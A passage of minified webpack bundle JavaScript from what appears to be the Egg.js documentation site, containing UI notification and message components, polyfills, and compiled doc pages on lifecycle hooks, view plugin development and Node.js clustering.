n=e.props,a=n.onClose,r=n.noticeKey;a&&a(r)},e.startCloseTimer=function(){e.props.duration&&(e.closeTimer=window.setTimeout((function(){e.close()}),1e3*e.props.duration))},e.clearCloseTimer=function(){e.closeTimer&&(clearTimeout(e.closeTimer),e.closeTimer=null)},e}return Object(o["a"])(n,[{key:"componentDidMount",value:function(){this.startCloseTimer()}},{key:"componentDidUpdate",value:function(e){(this.props.duration!==e.duration||this.props.updateMark!==e.updateMark||this.props.visible!==e.visible&&this.props.visible)&&this.restartCloseTimer()}},{key:"componentWillUnmount",value:function(){this.clearCloseTimer()}},{key:"restartCloseTimer",value:function(){this.clearCloseTimer(),this.startCloseTimer()}},{key:"render",value:function(){var e=this,t=this.props,n=t.prefixCls,l=t.className,o=t.closable,i=t.closeIcon,c=t.style,u=t.onClick,m=t.children,h=t.holder,g="".concat(n,"-notice"),f=Object.keys(this.props).reduce((function(t,n){return"data-"!==n.substr(0,5)&&"aria-"!==n.substr(0,5)&&"role"!==n||(t[n]=e.props[n]),t}),{}),E=s["createElement"]("div",Object(a["a"])({className:p()(g,l,Object(r["a"])({},"".concat(g,"-closable"),o)),style:c,onMouseEnter:this.clearCloseTimer,onMouseLeave:this.startCloseTimer,onClick:u},f),s["createElement"]("div",{className:"".concat(g,"-content")},m),o?s["createElement"]("a",{tabIndex:0,onClick:this.close,className:"".concat(g,"-close")},i||s["createElement"]("span",{className:"".concat(g,"-close-x")})):null);return h?d.a.createPortal(E,h):E}}]),n}(s["Component"]);h.defaultProps={onClose:function(){},duration:1.5}},yptB:function(e,t,n){"use strict";var a=n("MAgz"),r=n("WQtb").includes,l=a.aTypedArray,o=a.exportTypedArrayMethod;o("includes",(function(e){return r(l(this),e,arguments.length>1?arguments[1]:void 0)}))},ysnP:function(e,t,n){var a=n("XS8S");e.exports=a&&!Symbol.sham&&"symbol"==typeof Symbol.iterator},yuVb:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e3a\u4e86\u4f7f\u5f97\u5927\u5bb6\u66f4\u65b9\u4fbf\u5730\u63a7\u5236\u52a0\u8f7d\u5e94\u7528\u548c\u63d2\u4ef6\u7684\u65f6\u673a\uff0c\u6211\u4eec\u5bf9 Loader \u7684\u751f\u547d\u5468\u671f\u51fd\u6570\u8fdb\u884c\u4e86\u7cbe\u7b80\u5904\u7406\u3002\u6982\u62ec\u5730\u8bf4\uff0c\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u76ee\u524d\u603b\u5171\u53ef\u4ee5\u5206\u6210\u4e24\u79cd\u5f62\u5f0f\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u51fd\u6570\u5f62\u5f0f\uff08\u5df2\u7ecf\u4f5c\u5e9f\uff0c\u4ec5\u4e3a\u517c\u5bb9\u4fdd\u7559\uff09\u3002"),r.a.createElement("li",null,"\u7c7b\u5f62\u5f0f\uff08\u63a8\u8350\u4f7f\u7528\uff09\u3002")),r.a.createElement("h2",{id:"beforestart-\u51fd\u6570\u66ff\u4ee3"},r.a.createElement(l["AnchorLink"],{to:"#beforestart-\u51fd\u6570\u66ff\u4ee3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"beforeStart \u51fd\u6570\u66ff\u4ee3"),r.a.createElement("p",null,"\u6211\u4eec\u901a\u5e38\u5728 app.js \u4e2d\u901a\u8fc7 ",r.a.createElement("code",null,"module.export")," \u4e2d\u4f20\u5165\u7684 ",r.a.createElement("code",null,"app")," \u53c2\u6570\u8fdb\u884c\u6b64\u51fd\u6570\u7684\u64cd\u4f5c\uff0c\u4e00\u4e2a\u5178\u578b\u7684\u4f8b\u5b50\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeStart(async () => {\n    // \u6b64\u5904\u662f\u4f60\u539f\u6765\u7684\u903b\u8f91\u4ee3\u7801\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u5347\u7ea7\u4e4b\u540e\u7684\u5199\u6cd5\u7565\u6709\u6539\u53d8 \u2014\u2014 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5728 ",r.a.createElement("code",null,"app.js")," \u4e2d\u7528\u7c7b\u65b9\u6cd5\u7684\u5f62\u5f0f\u4f53\u73b0\u51fa\u6765\uff1a\u5bf9\u4e8e\u5e94\u7528\u5f00\u53d1\u800c\u8a00\uff0c\u6211\u4eec\u5e94\u8be5\u5199\u5728 ",r.a.createElement("code",null,"willReady")," \u65b9\u6cd5\u4e2d\uff1b\u5bf9\u4e8e\u63d2\u4ef6\u5219\u5199\u5728 ",r.a.createElement("code",null,"didLoad")," \u4e2d\u3002\u5f62\u5f0f\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// app.js \u6216 agent.js \u6587\u4ef6\uff1a\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async didLoad() {\n    // \u8bf7\u5c06\u4f60\u7684\u63d2\u4ef6\u9879\u76ee\u4e2d app.beforeStart \u4e2d\u7684\u4ee3\u7801\u7f6e\u4e8e\u6b64\u5904\u3002\n  }\n\n  async willReady() {\n    // \u8bf7\u5c06\u4f60\u7684\u5e94\u7528\u9879\u76ee\u4e2d app.beforeStart \u4e2d\u7684\u4ee3\u7801\u7f6e\u4e8e\u6b64\u5904\u3002\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("h2",{id:"ready-\u51fd\u6570\u66ff\u4ee3"},r.a.createElement(l["AnchorLink"],{to:"#ready-\u51fd\u6570\u66ff\u4ee3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ready \u51fd\u6570\u66ff\u4ee3"),r.a.createElement("p",null,"\u540c\u6837\u5730\uff0c\u6211\u4eec\u4e4b\u524d\u5728 ",r.a.createElement("code",null,"app.ready")," \u4e2d\u5904\u7406\u6211\u4eec\u7684\u903b\u8f91\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.ready(async () => {\n    // \u6b64\u5904\u662f\u4f60\u539f\u6765\u7684\u903b\u8f91\u4ee3\u7801\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u76f4\u63a5\u7528 ",r.a.createElement("code",null,"didReady")," \u8fdb\u884c\u66ff\u6362\uff1a"),r.a.createElement(o["a"],{code:"// app.js \u6216 agent.js \u6587\u4ef6\uff1a\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async didReady() {\n    // \u8bf7\u5c06\u60a8\u7684 app.ready \u4e2d\u7684\u4ee3\u7801\u7f6e\u4e8e\u6b64\u5904\u3002\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("h2",{id:"beforeclose-\u51fd\u6570\u66ff\u4ee3"},r.a.createElement(l["AnchorLink"],{to:"#beforeclose-\u51fd\u6570\u66ff\u4ee3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"beforeClose \u51fd\u6570\u66ff\u4ee3"),r.a.createElement("p",null,"\u539f\u5148\u7684 ",r.a.createElement("code",null,"app.beforeClose")," \u5982\u4ee5\u4e0b\u5f62\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeClose(async () => {\n    // \u6b64\u5904\u662f\u4f60\u539f\u6765\u7684\u903b\u8f91\u4ee3\u7801\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u6211\u4eec\u53ea\u9700\u4f7f\u7528\u7c7b\u65b9\u6cd5 ",r.a.createElement("code",null,"beforeClose")," \u66ff\u4ee3\u5373\u53ef\uff1a"),r.a.createElement(o["a"],{code:"// app.js \u6216 agent.js \u6587\u4ef6\uff1a\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  async beforeClose() {\n    // \u8bf7\u5c06\u60a8\u7684 app.beforeClose \u4e2d\u7684\u4ee3\u7801\u7f6e\u4e8e\u6b64\u5904\u3002\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u5176\u5b83\u8bf4\u660e"},r.a.createElement(l["AnchorLink"],{to:"#\u5176\u5b83\u8bf4\u660e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5176\u5b83\u8bf4\u660e"),r.a.createElement("p",null,"\u672c\u6559\u7a0b\u53ea\u662f\u4e00\u5bf9\u4e00\u5730\u8bb2\u4e86\u66ff\u6362\u65b9\u6cd5\uff0c\u4fbf\u4e8e\u5f00\u53d1\u8005\u4eec\u5feb\u901f\u4e0a\u624b\u8fdb\u884c\u66ff\u6362\uff1b\u82e5\u60f3\u8981\u5177\u4f53\u4e86\u89e3\u6574\u4e2a Loader \u539f\u7406\u4ee5\u53ca\u751f\u547d\u5468\u671f\u7684\u5b8c\u6574\u51fd\u6570\u7248\u672c\uff0c\u8bf7\u53c2\u8003",r.a.createElement(l["Link"],{to:"./loader"},"\u52a0\u8f7d\u5668"),"\u548c",r.a.createElement(l["Link"],{to:"../basics/app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49"),"\u4e24\u7bc7\u6587\u7ae0\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"z/Sa":function(e,t,n){var a=n("0mt+"),r=n("ma9u"),l=n("V3tB");a({global:!0},{compositeSymbol:function(){return 1===arguments.length&&"string"===typeof arguments[0]?l("Symbol")["for"](arguments[0]):r.apply(null,arguments).get("symbol",l("Symbol"))}})},zAgc:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"In most cases, we need to read the data, render the template and then present it to the user. The framework does not force to use one template engine, but allows developers to select the ",r.a.createElement(l["Link"],{to:"../core/view"},"template")," by themselves. For details, see ",r.a.createElement(l["Link"],{to:"../core/view"},"Template Rendering"),"."),r.a.createElement("p",null,"This article describes the framework's specification constraints on the View plugin, and we can use this to encapsulate the corresponding template engine plugin. The following takes ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs"},"egg-view-ejs")," as an example."),r.a.createElement("h2",{id:"plugin-directory-structure"},r.a.createElement(l["AnchorLink"],{to:"#plugin-directory-structure","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Directory Structure"),r.a.createElement(o["a"],{code:"egg-view-ejs\n\u251c\u2500\u2500 config\n\u2502 \u251c\u2500\u2500 config.default.js\n\u2502 \u2514\u2500\u2500 config.local.js\n\u251c\u2500\u2500 lib\n\u2502 \u2514\u2500\u2500 view.js\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 test\n\u251c\u2500\u2500 History.md\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("h2",{id:"plugin-naming-convention"},r.a.createElement(l["AnchorLink"],{to:"#plugin-naming-convention","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Naming Convention"),r.a.createElement("ul",null,r.a.createElement("li",null,"Follow the ",r.a.createElement(l["Link"],{to:"./plugin"},"plugin development specification")),r.a.createElement("li",null,"According to the convention, the names of plugins start with ",r.a.createElement("code",null,"egg-view-")),r.a.createElement("li",null,r.a.createElement("code",null,"package.json")," is configured as follows. Plugins are named after the template engine, such as ejs")),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-ejs",\n  "eggPlugin": {\n    "name": "ejs"\n  },\n  "keywords": ["egg", "egg-plugin", "egg-view", "ejs"]\n}',lang:"json"}),r.a.createElement("ul",null,r.a.createElement("li",null,"The configuration item is also named after the template engine")),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  ejs: {},\n};",lang:"js"}),r.a.createElement("h2",{id:"view-base-class"},r.a.createElement(l["AnchorLink"],{to:"#view-base-class","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"View Base Class"),r.a.createElement("p",null,"The next step is to provide a View base class that will be instantiated on each request."),r.a.createElement("p",null,"The base class of the View needs to provide ",r.a.createElement("code",null,"render")," and ",r.a.createElement("code",null,"renderString")," methods and supports generator and async functions (it can also be a function that returns a Promise). The ",r.a.createElement("code",null,"render")," method is used to render files, and the ",r.a.createElement("code",null,"renderString")," method is used to render template strings."),r.a.createElement("p",null,"The following is a simplified code that can be directly ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-ejs/blob/master/lib/view.js"},"view source")),r.a.createElement(o["a"],{code:"const ejs = require('ejs');\n\nMmdule.exports = class EjsView {\n  render(filename, locals) {\n    return new Promise((resolve, reject) => {\n      // Asynchronous API call\n      ejs.renderFile(filename, locals, (err, result) => {\n        if (err) {\n          reject(err);\n        } else {\n          resolve(result);\n        }\n      });\n    });\n  }\n\n  renderString(tpl, locals) {\n    try {\n      // Synchronous API call\n      return Promise.resolve(ejs.render(tpl, locals));\n    } catch (err) {\n      return Promise.reject(err);\n    }\n  }\n};",lang:"js"}),r.a.createElement("h3",{id:"parameters"},r.a.createElement(l["AnchorLink"],{to:"#parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Parameters"),r.a.createElement("p",null,"The three parameters of the ",r.a.createElement("code",null,"render")," method are:"),r.a.createElement("ul",null,r.a.createElement("li",null,"filename: is the path to the complete file. The framework determines if the file exists when looking for the file. It does not need to be processed here."),r.a.createElement("li",null,"locals: The data needs rendering. It comes from ",r.a.createElement("code",null,"app.locals"),", ",r.a.createElement("code",null,"ctx.locals")," and calls ",r.a.createElement("code",null,"render")," methods. The framework also has built in ",r.a.createElement("code",null,"ctx"),", ",r.a.createElement("code",null,"request"),", ",r.a.createElement("code",null,"ctx.helper")," objects."),r.a.createElement("li",null,"viewOptions: The incoming configuration of the user, which can override the default configuration of the template engine. This can be considered based on the characteristics of the template engine. For example, the cache is enabled by default but a page does not need to be cached.")),r.a.createElement("p",null,"The three parameters of the ",r.a.createElement("code",null,"renderString")," method:"),r.a.createElement("ul",null,r.a.createElement("li",null,"tpl: template string, not file path."),r.a.createElement("li",null,"locals: same with ",r.a.createElement("code",null,"render"),"."),r.a.createElement("li",null,"viewOptions: same with ",r.a.createElement("code",null,"render"),".")),r.a.createElement("h2",{id:"plugin-configuration"},r.a.createElement(l["AnchorLink"],{to:"#plugin-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin Configuration"),r.a.createElement("p",null,"According to the naming conventions mentioned above, the configuration name is generally the name of the template engine, such as ejs."),r.a.createElement("p",null,"The configuration of the plugin mainly comes from the configuration of the template engine, and the configuration items can be defined according to the specific conditions, such as the ",r.a.createElement(l["Link"],{to:"https://github.com/mde/ejs#options"},"configuration of ejs"),"."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  ejs: {\n    cache: true,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"The framework provides ",r.a.createElement("code",null,"ctx.helper")," for developer use, but in some cases we want to override the helper method and only take effect when the template is rendered."),r.a.createElement("p",null,"In template rendering, we often need to output a user-supplied html fragment, in which case, we often use the ",r.a.createElement("code",null,"helper.shtml")," provided by the ",r.a.createElement("code",null,"egg-security")," plugin."),r.a.createElement(o["a"],{code:"<div>{{ helper.shtml(data.content) | safe }}</div>",lang:"html"}),r.a.createElement("p",null,"However, as shown in the code above, we need to use ",r.a.createElement("code",null,"| safe")," to tell the template engine that the html is safe and it doesn't need to run ",r.a.createElement("code",null,"escape")," again."),r.a.createElement("p",null,"This is more cumbersome to use and easy to forget, so we can package it:"),r.a.createElement("ul",null,r.a.createElement("li",null,"First provide a helper subclass:")),r.a.createElement(o["a"],{code:"// {plugin_root}/lib/helper.js\nmodule.exports = (app) => {\n  return class ViewHelper extends app.Helper {\n    // safe is injected by [egg-view-nunjucks] and will not be escaped during rendering.\n    // Otherwise, the template call shtml will be escaped\n    shtml(str) {\n      return this.safe(super.shtml(str));\n    }\n  };\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Use a custom helper when rendering:")),r.a.createElement(o["a"],{code:"// {plugin_root}/lib/view.js\nconst ViewHelper = require('./helper');\n\nmodule.exports = class MyCustomView {\n  render(filename, locals) {\n    locals.helper = new ViewHelper(this.ctx); // call Nunjucks render\n  }\n};",lang:"js"}),r.a.createElement("p",null,"You can ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks/blob/2ee5ee992cfd95bc0bb5b822fbd72a6778edb118/lib/view.js#L11"},"view")," the specific code here"),r.a.createElement("h3",{id:"security-related"},r.a.createElement(l["AnchorLink"],{to:"#security-related","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Security Related"),r.a.createElement("p",null,"Templates and security are related and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," also provides some methods for the template. The template engine can be used according to requirements."),r.a.createElement("p",null,"First declare a dependency on ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security"),":"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-nunjucks",\n  "eggPlugin": {\n    "name": "nunjucks",\n    "dep": ["security"]\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Besides, the framework provides ",r.a.createElement(l["AnchorLink"],{to:"../core/security#appinjectcsrfstr"},"app.injectCsrf")," and ",r.a.createElement(l["AnchorLink"],{to:"../core/security#appinjectnonncestr"},"app.injectNonce"),", for more information on ",r.a.createElement(l["Link"],{to:"../core/security"},"security section"),"."),r.a.createElement("h3",{id:"unit-tests"},r.a.createElement(l["AnchorLink"],{to:"#unit-tests","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Unit Tests"),r.a.createElement("p",null,"As a high-quality plugin, perfect unit testing is indispensable, and we also provide lots of auxiliary tools to make it painless for plugin developers to write tests with, see ",r.a.createElement(l["Link"],{to:"../core/unittest"},"unit testing")," and ",r.a.createElement(l["Link"],{to:"./plugin"},"plugin")," docs.")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},zCNj:function(e,t,n){var a=n("R+Ix");e.exports=/Version\/10\.\d+(\.\d+)?( Mobile\/\w+)? Safari\//.test(a)},zHUK:function(e,t,n){"use strict";var a=n("0mt+"),r=n("wzTy"),l=n("SCbZ"),o=n("N0Us"),i=n("m/os"),c=n("HmG0"),s=n("ESQ9"),u=n("mIyh"),d=n("hOjR"),m=u("splice"),p=d("splice",{ACCESSORS:!0,0:0,1:2}),h=Math.max,g=Math.min,f=9007199254740991,E="Maximum allowed length exceeded";a({target:"Array",proto:!0,forced:!m||!p},{splice:function(e,t){var n,a,u,d,m,p,b=i(this),v=o(b.length),y=r(e,v),k=arguments.length;if(0===k?n=a=0:1===k?(n=0,a=v-y):(n=k-2,a=g(h(l(t),0),v-y)),v+n-a>f)throw TypeError(E);for(u=c(b,a),d=0;d<a;d++)m=y+d,m in b&&s(u,d,b[m]);if(u.length=a,n<a){for(d=y;d<v-a;d++)m=d+a,p=d+n,m in b?b[p]=b[m]:delete b[p];for(d=v;d>v-a+n;d--)delete b[d-1]}else if(n>a)for(d=v-a;d>y;d--)m=d+a-1,p=d+n-1,m in b?b[p]=b[m]:delete b[p];for(d=0;d<n;d++)b[d+y]=arguments[d+2];return b.length=v-a+n,u}})},zIYL:function(e,t){var n="undefined"!==typeof Element,a="function"===typeof Map,r="function"===typeof Set,l="function"===typeof ArrayBuffer&&!!ArrayBuffer.isView;function o(e,t){if(e===t)return!0;if(e&&t&&"object"==typeof e&&"object"==typeof t){if(e.constructor!==t.constructor)return!1;var i,c,s,u;if(Array.isArray(e)){if(i=e.length,i!=t.length)return!1;for(c=i;0!==c--;)if(!o(e[c],t[c]))return!1;return!0}if(a&&e instanceof Map&&t instanceof Map){if(e.size!==t.size)return!1;u=e.entries();while(!(c=u.next()).done)if(!t.has(c.value[0]))return!1;u=e.entries();while(!(c=u.next()).done)if(!o(c.value[1],t.get(c.value[0])))return!1;return!0}if(r&&e instanceof Set&&t instanceof Set){if(e.size!==t.size)return!1;u=e.entries();while(!(c=u.next()).done)if(!t.has(c.value[0]))return!1;return!0}if(l&&ArrayBuffer.isView(e)&&ArrayBuffer.isView(t)){if(i=e.length,i!=t.length)return!1;for(c=i;0!==c--;)if(e[c]!==t[c])return!1;return!0}if(e.constructor===RegExp)return e.source===t.source&&e.flags===t.flags;if(e.valueOf!==Object.prototype.valueOf&&"function"===typeof e.valueOf&&"function"===typeof t.valueOf)return e.valueOf()===t.valueOf();if(e.toString!==Object.prototype.toString&&"function"===typeof e.toString&&"function"===typeof t.toString)return e.toString()===t.toString();if(s=Object.keys(e),i=s.length,i!==Object.keys(t).length)return!1;for(c=i;0!==c--;)if(!Object.prototype.hasOwnProperty.call(t,s[c]))return!1;if(n&&e instanceof Element)return!1;for(c=i;0!==c--;)if(("_owner"!==s[c]&&"__v"!==s[c]&&"__o"!==s[c]||!e.$$typeof)&&!o(e[s[c]],t[s[c]]))return!1;return!0}return e!==e&&t!==t}e.exports=function(e,t){try{return o(e,t)}catch(n){if((n.message||"").match(/stack|recursion/i))return console.warn("react-fast-compare cannot handle circular refs"),!1;throw n}}},zKj5:function(e,t,n){"use strict";n.d(t,"c",(function(){return U})),n.d(t,"d",(function(){return W})),n.d(t,"a",(function(){return Q}));var a=n("2EJr"),r=n("qPib"),l=n("3Qq0"),o=n("FU0I"),i={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm193.5 301.7l-210.6 292a31.8 31.8 0 01-51.7 0L318.5 484.9c-3.8-5.3 0-12.7 6.5-12.7h46.9c10.2 0 19.9 4.9 25.9 13.3l71.2 98.8 157.2-218c6-8.3 15.6-13.3 25.9-13.3H699c6.5 0 10.3 7.4 6.5 12.7z"}}]},name:"check-circle",theme:"filled"},c=i,s=n("Il1s"),u=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:c}))};u.displayName="CheckCircleFilled";var d=o["forwardRef"](u),m=n("ygTs"),p={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm-32 232c0-4.4 3.6-8 8-8h48c4.4 0 8 3.6 8 8v272c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8V296zm32 440a48.01 48.01 0 010-96 48.01 48.01 0 010 96z"}}]},name:"exclamation-circle",theme:"filled"},h=p,g=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:h}))};g.displayName="ExclamationCircleFilled";var f=o["forwardRef"](g),E={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm32 664c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8V456c0-4.4 3.6-8 8-8h48c4.4 0 8 3.6 8 8v272zm-32-344a48.01 48.01 0 010-96 48.01 48.01 0 010 96z"}}]},name:"info-circle",theme:"filled"},b=E,v=function(e,t){return o["createElement"](s["a"],Object(l["a"])(Object(l["a"])({},e),{},{ref:t,icon:b}))};v.displayName="InfoCircleFilled";var y,k=o["forwardRef"](v),w=n("fGYQ"),x=n("VGn1"),j=n.n(x),S=n("n0SI"),C=n("sAEC"),A=n("0YMn"),L=n("bymz"),T=n("2HmL");function N(e,t){var n=function(){var n,r,l=null,i={add:function(e,t){null===l||void 0===l||l.component.add(e,t)}},c=Object(L["a"])(i),s=Object(A["a"])(c,2),u=s[0],d=s[1];function m(o){var i=o.prefixCls,c=n("message",i),s=n(),d=o.key||U(),m=new Promise((function(n){var i=function(){return"function"===typeof o.onClose&&o.onClose(),n(!0)};e(Object(a["a"])(Object(a["a"])({},o),{prefixCls:c,rootPrefixCls:s,getPopupContainer:r}),(function(e){var n=e.prefixCls,r=e.instance;l=r,u(t(Object(a["a"])(Object(a["a"])({},o),{key:d,onClose:i}),n))}))})),p=function(){l&&l.removeNotice(d)};return p.then=function(e,t){return m.then(e,t)},p.promise=m,p}var p=o["useRef"]({});return p.current.open=m,W.forEach((function(e){return Q(p.current,e)})),[p.current,o["createElement"](T["a"],{key:"holder"},(function(e){return n=e.getPrefixCls,r=e.getPopupContainer,d}))]};return n}var O,I,P,R=3,_=1,q="",M="move-up",F=!1,D=!1;function U(){return _++}function z(e){void 0!==e.top&&(O=e.top,y=null),void 0!==e.duration&&(R=e.duration),void 0!==e.prefixCls&&(q=e.prefixCls),void 0!==e.getContainer&&(I=e.getContainer,y=null),void 0!==e.transitionName&&(M=e.transitionName,y=null,F=!0),void 0!==e.maxCount&&(P=e.maxCount,y=null),void 0!==e.rtl&&(D=e.rtl)}function H(e,t){var n=e.prefixCls,a=e.getPopupContainer,r=Object(C["b"])(),l=r.getPrefixCls,o=r.getRootPrefixCls,i=r.getIconPrefixCls,c=l("message",n||q),s=o(e.rootPrefixCls,c),u=i();if(y)t({prefixCls:c,rootPrefixCls:s,iconPrefixCls:u,instance:y});else{var d={prefixCls:c,transitionName:F?M:"".concat(s,"-").concat(M),style:{top:O},getContainer:I||a,maxCount:P};S["a"].newInstance(d,(function(e){y?t({prefixCls:c,rootPrefixCls:s,iconPrefixCls:u,instance:y}):(y=e,t({prefixCls:c,rootPrefixCls:s,iconPrefixCls:u,instance:e}))}))}}var B={info:k,success:d,error:m["a"],warning:f,loading:w["a"]},W=Object.keys(B);function V(e,t,n){var a,l=void 0!==e.duration?e.duration:R,i=B[e.type],c=j()("".concat(t,"-custom-content"),(a={},Object(r["a"])(a,"".concat(t,"-").concat(e.type),e.type),Object(r["a"])(a,"".concat(t,"-rtl"),!0===D),a));return{key:e.key,duration:l,style:e.style||{},className:e.className,content:o["createElement"](C["a"],{iconPrefixCls:n},o["createElement"]("div",{className:c},e.icon||i&&o["createElement"](i,null),o["createElement"]("span",null,e.content))),onClose:e.onClose,onClick:e.onClick}}function $(e){var t=e.key||U(),n=new Promise((function(n){var r=function(){return"function"===typeof e.onClose&&e.onClose(),n(!0)};H(e,(function(n){var l=n.prefixCls,o=n.iconPrefixCls,i=n.instance;i.notice(V(Object(a["a"])(Object(a["a"])({},e),{key:t,onClose:r}),l,o))}))})),r=function(){var n;y&&(y.removeNotice(t),null===(n=e.onClose)||void 0===n||n.call(e))};return r.then=function(e,t){return n.then(e,t)},r.promise=n,r}function G(e){return"[object Object]"===Object.prototype.toString.call(e)&&!!e.content}var X={open:$,config:z,destroy:function(e){if(y)if(e){var t=y,n=t.removeNotice;n(e)}else{var a=y,r=a.destroy;r(),y=null}}};function Q(e,t){e[t]=function(n,r,l){return G(n)?e.open(Object(a["a"])(Object(a["a"])({},n),{type:t})):("function"===typeof r&&(l=r,r=void 0),e.open({content:n,duration:r,type:t,onClose:l}))}}W.forEach((function(e){return Q(X,e)})),X.warn=X.warning,X.useMessage=N(H,V);t["b"]=X},"zKw/":function(e,t,n){"use strict";var a=n("oyD1");e.exports=function(){var e=a(this),t="";return e.global&&(t+="g"),e.ignoreCase&&(t+="i"),e.multiline&&(t+="m"),e.dotAll&&(t+="s"),e.unicode&&(t+="u"),e.sticky&&(t+="y"),t}},zNXo:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"We know that JavaScript codes are run on single thread, in other words, one Node.js process only runs on one CPU. So if we use Node.js as a Web Server, we cannot benefit from multi-core any more. As an enterprise-level solution, one problem that must be solved is:"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"how to squeeze all server resources, taking advantages of multi-cores?")),r.a.createElement("p",null,"And the official solution provided by Node.js is ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/cluster.html"},"Cluster module"),", and there's an introduction:"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"A single instance of Node.js runs in a single thread. To take advantage of multi-core systems the user will sometimes want to launch a cluster of Node.js processes to handle the load."),r.a.createElement("p",null,"The cluster module allows you to easily create child processes that all share server ports.")),r.a.createElement("h1",{id:"what-is-cluster"},r.a.createElement(l["AnchorLink"],{to:"#what-is-cluster","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"What is Cluster?"),r.a.createElement("p",null,"In 